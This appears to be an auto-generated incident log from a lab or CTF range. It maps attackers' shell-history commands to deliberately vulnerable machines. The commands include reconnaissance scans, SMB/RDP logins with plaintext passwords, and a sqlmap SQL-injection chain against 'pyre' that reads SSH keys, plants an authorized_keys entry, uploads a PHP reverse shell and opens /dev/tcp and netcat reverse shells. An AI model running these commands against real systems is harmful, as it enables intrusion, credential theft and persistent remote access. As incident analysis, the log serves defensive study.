- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:02:00 | logs/10.100.7.34/shell_history.csv#L65 | nxc smb http://10.100.7.46/ u-username p-password
  - 2026-01-27T19:02:05 | logs/10.100.7.32/shell_history.csv#L634 | nxc smb 10.100.7.46 -u EMBER -p 'h3ab9pR32xd5A84VAGLS'
  - 2026-01-27T19:02:11 | logs/10.100.7.32/shell_history.csv#L635 | nxc smb 10.100.7.46 -u EMBER -p 'h3ab9pR32xd5A84VAGLS' --shares
  - 2026-01-27T19:02:04 | logs/10.100.7.14/shell_history.csv#L315 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:02:13 | logs/10.100.7.14/shell_history.csv#L316 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:02:20 | logs/10.100.7.14/shell_history.csv#L317 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:02:00 | logs/10.100.7.24/shell_history.csv#L258 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:02:13 | logs/10.100.7.24/shell_history.csv#L259 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:02:16 | logs/10.100.7.24/shell_history.csv#L260 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:02:18 | logs/10.100.7.24/shell_history.csv#L261 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:02:19 | logs/10.100.7.24/shell_history.csv#L262 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 39 - 2026-02-10T19:18:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:18:29 | logs/10.100.7.34/shell_history.csv#L78 | nmap -sC -sV -p- -T4 10.100.7.48
  - 2026-02-10T19:18:01 | logs/10.100.7.14/shell_history.csv#L563 | mysql -h 10.100.7.48 -P 3306 -uinspire
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 40 - 2026-02-10T19:26:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:26:05 | logs/10.100.7.34/shell_history.csv#L100 | whatweb http://10.100.7.48
  - 2026-02-10T19:26:51 | logs/10.100.7.34/shell_history.csv#L101 | gobuster dir -u http://10.100.7.48/ -w /usr/share/wordlists/dirb/common.txt
  - 2026-02-10T19:26:31 | logs/10.100.7.14/shell_history.csv#L565 | mysql -h 10.100.7.48 -P 3306 -u inspire
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 41 - 2026-02-10T19:54:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T19:54:15 | logs/10.100.7.34/shell_history.csv#L110 | nmap -sC -sV -p 3389,445 10.100.7.42
  - 2026-02-10T19:54:54 | logs/10.100.7.14/shell_history.csv#L609 | 10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 42 - 2026-02-10T19:55:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T19:55:34 | logs/10.100.7.34/shell_history.csv#L111 | nmap -sC -sV -p- -T4 10.100.7.42
  - 2026-02-10T19:55:48 | logs/10.100.7.34/shell_history.csv#L112 | smbclient -L //10.100.7.42/ -N
  - 2026-02-10T19:55:00 | logs/10.100.7.14/shell_history.csv#L610 | nmap 10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 43 - 2026-01-26T19:28:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:28:32 | logs/10.100.7.14/shell_history.csv#L245 | nxc smb 10.100.7.46 -u guest  -p ''
  - 2026-01-26T19:28:01 | logs/10.100.7.24/shell_history.csv#L163 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 44 - 2026-01-26T19:39:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:39:06 | logs/10.100.7.24/shell_history.csv#L188 | xfreerdp3 /u:rand2 /v:10.100.7.46 /p:dFMVxYA4
  - 2026-01-26T19:39:12 | logs/10.100.7.24/shell_history.csv#L189 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4!
  - 2026-01-26T19:39:30 | logs/10.100.7.31/shell_history.csv#L20 | enum4linux -a 10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 45 - 2026-01-26T20:01:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
  - 2026-01-26T20:01:58 | logs/10.100.7.32/shell_history.csv#L618 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.44
  - 2026-01-26T20:01:04 | logs/10.100.7.24/shell_history.csv#L224 | gobuster dir -u https://http://10.100.7.44/ -w wordlist.txt
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 46 - 2026-01-26T20:02:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
  - 2026-01-26T20:02:06 | logs/10.100.7.32/shell_history.csv#L621 | ssh forge@10.100.7.44
  - 2026-01-26T20:02:37 | logs/10.100.7.24/shell_history.csv#L227 | gobuster dir -u https://http://10.100.7.44/ -w wordlist.txt
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 47 - 2026-01-27T19:00:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:00:36 | logs/10.100.7.32/shell_history.csv#L632 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:00:45 | logs/10.100.7.32/shell_history.csv#L633 | nxc smb 10.100.7.46 -u guest -p ''
  - 2026-01-27T19:00:08 | logs/10.100.7.14/shell_history.csv#L307 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:00:52 | logs/10.100.7.14/shell_history.csv#L308 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:00:46 | logs/10.100.7.22/shell_history.csv#L181 | nxc smb [10.100.7.46] -u guest -p
  - 2026-01-27T19:00:33 | logs/10.100.7.24/shell_history.csv#L252 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:00:58 | logs/10.100.7.24/shell_history.csv#L253 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 48 - 2026-02-02T18:48:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T18:48:33 | logs/10.100.7.32/shell_history.csv#L771 | curl http://10.100.7.45/panels.php?id=%22test%22
  - 2026-02-02T18:48:38 | logs/10.100.7.32/shell_history.csv#L772 | curl http://10.100.7.45/panels.php?id=test""
  - 2026-02-02T18:48:43 | logs/10.100.7.32/shell_history.csv#L773 | curl http://10.100.7.45/panels.php?id=%22test%22
  - 2026-02-02T18:48:37 | logs/10.100.7.14/shell_history.csv#L404 | nmap -sV -p 1-65535 -T3 10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 49 - 2026-02-02T19:22:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:22:58 | logs/10.100.7.32/shell_history.csv#L786 | sqlmap -u http://10.100.7.45/panels.php?id=1""
  - 2026-02-02T19:22:08 | logs/10.100.7.13/shell_history.csv#L293 | gobuster dir -u http://10.100.7.45 -w /usr/share/wordlists/dirb/common.txt
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 50 - 2026-02-02T19:28:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:28:40 | logs/10.100.7.32/shell_history.csv#L805 | sqlmap -u http://10.100.7.45/panels.php?id=1""
  - 2026-02-02T19:28:21 | logs/10.100.7.14/shell_history.csv#L408 | sqlmap -u http://10.100.7.45" --dbs"
  - 2026-02-02T19:28:45 | logs/10.100.7.13/shell_history.csv#L296 | curl http://10.100.7.45/index.php?id=1'""
  - 2026-02-02T19:28:39 | logs/10.100.7.12/shell_history.csv#L166 | sqlmap -u 10.100.7.45/panels?id=1" --file-read=/etc/passwd"
  - 2026-02-02T19:28:47 | logs/10.100.7.12/shell_history.csv#L167 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/etc/passwd"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 51 - 2026-02-02T19:31:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:31:06 | logs/10.100.7.32/shell_history.csv#L806 | sqlmap -u http://10.100.7.45/panels.php?id=1""
  - 2026-02-02T19:31:21 | logs/10.100.7.32/shell_history.csv#L807 | sqlmap -u http://10.100.7.45/panels.php?id=1" --dbs"
  - 2026-02-02T19:31:28 | logs/10.100.7.32/shell_history.csv#L808 | sqlmap -u http://10.100.7.45/panels.php?id=1" --dbs"
  - 2026-02-02T19:31:36 | logs/10.100.7.32/shell_history.csv#L809 | cd ~/.local/share/sqlmap/output/10.100.7.45
  - 2026-02-02T19:31:20 | logs/10.100.7.14/shell_history.csv#L413 | sqlmap -u http://10.100.7.45/index.php?id=1" --dbs --crawl=2 --risk=3"
  - 2026-02-02T19:31:03 | logs/10.100.7.13/shell_history.csv#L297 | curl http://10.100.7.45/index.php?id=5""
  - 2026-02-02T19:31:37 | logs/10.100.7.12/shell_history.csv#L170 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/root/.ssh/id_rsa --hex"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 52 - 2026-02-02T19:34:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:34:17 | logs/10.100.7.32/shell_history.csv#L815 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" --tables"
  - 2026-02-02T19:34:57 | logs/10.100.7.13/shell_history.csv#L299 | curl http://10.100.7.45/panels.php?id=abc""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 53 - 2026-02-02T19:37:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:37:32 | logs/10.100.7.32/shell_history.csv#L820 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "information_schema" -T "FILES" --dump --threads $(nproc)"
  - 2026-02-02T19:37:35 | logs/10.100.7.32/shell_history.csv#L821 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "information_schema" -T "FILES" --dump --threads $(nproc)"
  - 2026-02-02T19:37:44 | logs/10.100.7.32/shell_history.csv#L824 | sqlmap -u http://10.100.7.45/panels.php?id=1" --dbs"
  - 2026-02-02T19:37:17 | logs/10.100.7.13/shell_history.csv#L301 | curl http://10.100.7.45/panels.php?id=5 AND 1=1""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 54 - 2026-02-02T19:38:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:38:43 | logs/10.100.7.32/shell_history.csv#L827 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" --tables"
  - 2026-02-02T19:38:52 | logs/10.100.7.32/shell_history.csv#L828 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" --tables --threads $(nproc)"
  - 2026-02-02T19:38:25 | logs/10.100.7.13/shell_history.csv#L302 | curl http://10.100.7.45/panels.php?id=5%20AND%201=1""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 55 - 2026-02-02T19:39:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:39:07 | logs/10.100.7.32/shell_history.csv#L829 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" -T "alerts" --threads $(nproc)"
  - 2026-02-02T19:39:53 | logs/10.100.7.12/shell_history.csv#L174 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads 10"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 56 - 2026-02-02T19:48:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:48:36 | logs/10.100.7.32/shell_history.csv#L851 | sqlmap -u http://10.100.7.45/panels.php?id=1""
  - 2026-02-02T19:48:13 | logs/10.100.7.13/shell_history.csv#L319 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%204--%20-""
  - 2026-02-02T19:48:28 | logs/10.100.7.13/shell_history.csv#L320 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%208--%20-""
  - 2026-02-02T19:48:41 | logs/10.100.7.13/shell_history.csv#L321 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%2010--%20-""
  - 2026-02-02T19:48:51 | logs/10.100.7.13/shell_history.csv#L322 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%2030--%20-""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 57 - 2026-02-02T19:50:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:50:33 | logs/10.100.7.32/shell_history.csv#L858 | sqlmap -u http://10.100.7.45/alerts.php?severity=&status=""
  - 2026-02-02T19:50:44 | logs/10.100.7.32/shell_history.csv#L859 | sqlmap -u http://10.100.7.45/alerts.php?severity=&status=""
  - 2026-02-02T19:50:33 | logs/10.100.7.12/shell_history.csv#L200 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write=./id_rsa --file-dest=/root/.ssh/id_rsa"
  - 2026-02-02T19:50:43 | logs/10.100.7.12/shell_history.csv#L201 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write=./rsa_id --file-dest=/root/.ssh/rsa_id"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 58 - 2026-02-02T19:52:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:52:48 | logs/10.100.7.32/shell_history.csv#L862 | sqlmap -u http://10.100.7.45/panels.php?id=1" --batch -D"
  - 2026-02-02T19:52:52 | logs/10.100.7.32/shell_history.csv#L863 | sqlmap -u http://10.100.7.45/panels.php?id=1" --batch"
  - 2026-02-02T19:52:59 | logs/10.100.7.32/shell_history.csv#L864 | sqlmap -u http://10.100.7.45/panels.php?id=" --batch"
  - 2026-02-02T19:52:02 | logs/10.100.7.13/shell_history.csv#L327 | curl http://10.100.7.45/panels.php?id=5%20AND%201=2""
  - 2026-02-02T19:52:27 | logs/10.100.7.12/shell_history.csv#L206 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/root/.ssh/"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 59 - 2026-02-02T19:54:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:54:22 | logs/10.100.7.32/shell_history.csv#L870 | sqlmap -u http://10.100.7.45/panels.php?id=1" --users --passwords"
  - 2026-02-02T19:54:53 | logs/10.100.7.13/shell_history.csv#L328 | curl http://10.100.7.45/panels.php?id=5%20AND%20database()%20IS%20NOT%20NULL""
  - 2026-02-02T19:54:21 | logs/10.100.7.12/shell_history.csv#L209 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write=id_rsa --file-dest=/root/.ssh/id_rsa"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 60 - 2026-02-03T18:45:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:45:07 | logs/10.100.7.32/shell_history.csv#L886 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads=$(nproc)"
  - 2026-02-03T18:45:07 | logs/10.100.7.32/shell_history.csv#L887 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads=$(nproc)"
  - 2026-02-03T18:45:07 | logs/10.100.7.32/shell_history.csv#L888 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads=$(nproc)"
  - 2026-02-03T18:45:07 | logs/10.100.7.32/shell_history.csv#L889 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads=$(nproc)"
  - 2026-02-03T18:45:35 | logs/10.100.7.12/shell_history.csv#L217 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="script.sh" --file-dest="/tmp/script.sh""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 61 - 2026-02-03T18:47:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:47:16 | logs/10.100.7.32/shell_history.csv#L893 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-write=/home/kali/.ssh/helios_ssh_key.pub --file-dest=/root/.ssh/authorized_keys"
  - 2026-02-03T18:47:33 | logs/10.100.7.32/shell_history.csv#L894 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-write=/home/kali/.ssh/helios_ssh_key.pub --file-dest=/root/.ssh/authorized_keys"
  - 2026-02-03T18:47:16 | logs/10.100.7.12/shell_history.csv#L219 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read="/tmp/script.sh""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 62 - 2026-02-03T18:53:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:53:45 | logs/10.100.7.32/shell_history.csv#L905 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-write=./ctrl.txt --file-dest=/home/pyre/ctrl.txt"
  - 2026-02-03T18:53:30 | logs/10.100.7.12/shell_history.csv#L222 | sqlmap -u 10.100.7.45" --os-cmd="whoami""
  - 2026-02-03T18:53:50 | logs/10.100.7.12/shell_history.csv#L223 | sqlmap -u 10.100.7.45" -p id --os-cmd="whoami""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 63 - 2026-02-03T18:54:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:54:56 | logs/10.100.7.32/shell_history.csv#L906 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd=whoami"
  - 2026-02-03T18:54:06 | logs/10.100.7.12/shell_history.csv#L224 | sqlmap -u 10.100.7.45.panels.php?id=1" --os-cmd="whoami""
  - 2026-02-03T18:54:20 | logs/10.100.7.12/shell_history.csv#L225 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-cmd="whoami""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 64 - 2026-02-03T18:55:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:55:28 | logs/10.100.7.32/shell_history.csv#L907 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd=ls"
  - 2026-02-03T18:55:46 | logs/10.100.7.32/shell_history.csv#L908 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="ls ../""
  - 2026-02-03T18:55:54 | logs/10.100.7.32/shell_history.csv#L909 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="ls ../../""
  - 2026-02-03T18:55:29 | logs/10.100.7.12/shell_history.csv#L226 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-cmd="sudo useradd mason""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 65 - 2026-02-03T19:01:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:01:09 | logs/10.100.7.32/shell_history.csv#L926 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="bash -i >& /dev/tcp/10.100.7.32/4444 0>&1""
  - 2026-02-03T19:01:31 | logs/10.100.7.32/shell_history.csv#L927 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="nc 10.100.7.32 4444 -e /bin/bash""
  - 2026-02-03T19:01:57 | logs/10.100.7.32/shell_history.csv#L928 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="sh -i >& /dev/tcp/10.100.7.32/4444 0>&1""
  - 2026-02-03T19:01:58 | logs/10.100.7.12/shell_history.csv#L228 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 66 - 2026-02-03T19:12:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:12:44 | logs/10.100.7.32/shell_history.csv#L934 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:12:03 | logs/10.100.7.12/shell_history.csv#L233 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read="/ctrl.txt""
  - 2026-02-03T19:12:50 | logs/10.100.7.12/shell_history.csv#L234 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read="home/pyre/ctrl.txt""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 67 - 2026-02-03T19:31:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:31:12 | logs/10.100.7.32/shell_history.csv#L952 | sqlmap -u http://10.100.7.45/panels.php?id=1" --write-file=./php-reverse-shell.php --dest-file=/var/www/html/rev-shell.php"
  - 2026-02-03T19:31:47 | logs/10.100.7.32/shell_history.csv#L953 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-write=./php-reverse-shell.php --file-dest=/var/www/html/rev-shell.php"
  - 2026-02-03T19:31:54 | logs/10.100.7.12/shell_history.csv#L253 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:31:20 | logs/10.100.7.31/shell_history.csv#L79 | gobuster dir -u http://10.100.7.45 -w directory-list-2.3-medium.txt
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 68 - 2026-02-03T19:43:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:43:04 | logs/10.100.7.32/shell_history.csv#L960 | ssh pyre@10.100.7.45
  - 2026-02-03T19:43:37 | logs/10.100.7.32/shell_history.csv#L961 | ssh pyre@10.100.7.45
  - 2026-02-03T19:43:57 | logs/10.100.7.32/shell_history.csv#L962 | ssh pyre@10.100.7.45
  - 2026-02-03T19:43:27 | logs/10.100.7.12/shell_history.csv#L267 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 69 - 2026-02-03T19:44:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:44:14 | logs/10.100.7.32/shell_history.csv#L963 | ssh root@10.100.7.45
  - 2026-02-03T19:44:00 | logs/10.100.7.12/shell_history.csv#L269 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="shell.py" --file-dest="/var/www/html/shell.py""
  - 2026-02-03T19:44:16 | logs/10.100.7.12/shell_history.csv#L270 | sqlmap -u 10.100.7.45/panels.php" --file-write="shell.py" --file-dest="/var/www/html/shell.py""
  - 2026-02-03T19:44:27 | logs/10.100.7.12/shell_history.csv#L271 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="shell.py" --file-dest="/var/www/html/shell.py""
  - 2026-02-03T19:44:53 | logs/10.100.7.12/shell_history.csv#L272 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 70 - 2026-01-26T19:11:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:11:15 | logs/10.100.7.14/shell_history.csv#L239 | nmap 10.100.7.46
  - 2026-01-26T19:11:48 | logs/10.100.7.14/shell_history.csv#L240 | nxc smb 10.100.7.46 -u guest -p ' '
  - 2026-01-26T19:11:41 | logs/10.100.7.24/shell_history.csv#L125 | smbclient -L //10.100.7.46 -U “”
  - 2026-01-26T19:11:58 | logs/10.100.7.24/shell_history.csv#L126 | smbclient //10.100.7.46/C -U “”
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 71 - 2026-01-26T19:12:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:12:03 | logs/10.100.7.14/shell_history.csv#L241 | nxc smb 10.100.7.46
  - 2026-01-26T19:12:51 | logs/10.100.7.24/shell_history.csv#L127 | smbclient //10.100.7.46/Scripts -U “”
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 72 - 2026-01-26T19:27:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:27:19 | logs/10.100.7.14/shell_history.csv#L243 | nxc smb 10.100.7.46 -u guest -p 'fdfdasdf'
  - 2026-01-26T19:27:52 | logs/10.100.7.14/shell_history.csv#L244 | nxc smb 10.100.7.46 -u ''  -p ''
  - 2026-01-26T19:27:40 | logs/10.100.7.24/shell_history.csv#L161 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4
  - 2026-01-26T19:27:46 | logs/10.100.7.24/shell_history.csv#L162 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 73 - 2026-01-26T19:29:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:29:09 | logs/10.100.7.14/shell_history.csv#L246 | nxc smb 10.100.7.46 -u guest  -p '' --shares
  - 2026-01-26T19:29:45 | logs/10.100.7.24/shell_history.csv#L165 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth
  - 2026-01-26T19:29:51 | logs/10.100.7.24/shell_history.csv#L166 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4
- Matched Vulnerability Notes:
